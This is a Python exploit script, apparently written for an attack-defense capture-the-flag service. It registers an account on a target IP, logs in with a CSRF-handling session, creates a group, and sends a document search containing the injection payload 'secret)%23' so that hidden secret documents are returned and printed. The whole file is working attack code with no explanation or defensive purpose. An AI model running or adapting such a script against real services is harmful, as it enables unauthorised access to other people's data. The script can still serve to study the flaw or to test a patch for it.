import sys
from requests import Session

ip = sys.argv[1]

url = 'http://%s:8888' % ip


class CsrfSession(Session):
    def post(self, url, data=None, json=None, **kwargs):
        if not data:
            data = dict()
        data['csrfmiddlewaretoken'] = self.cookies.get('csrftoken')
        return super().post(url, data, json, **kwargs)


s = CsrfSession()
login = 'lololololololo12311'
password = 'kekekekekekek12311'

data = dict(
    username=login,
    password=password,

)

new_data = data
new_data.update({'password2': password, 'signup_submit': 'Enter'})

s.get(url + '/auth/register')
s.post(url + '/auth/register', data=new_data)

s.get(url + '/auth/login')
new_data = data
new_data.update({'signup_submit': 'Enter'})
s.post(url + '/auth/login', data=new_data)

group_name = 'WOWGROUP1235555asdasdccccc'
s.get(url + '/groups/create')
r = s.post(url + '/groups/create', data=dict(name=group_name))
group_url = r.url

resp = s.get(group_url + 'documents/search?q=secret)%23')
print(resp.text)
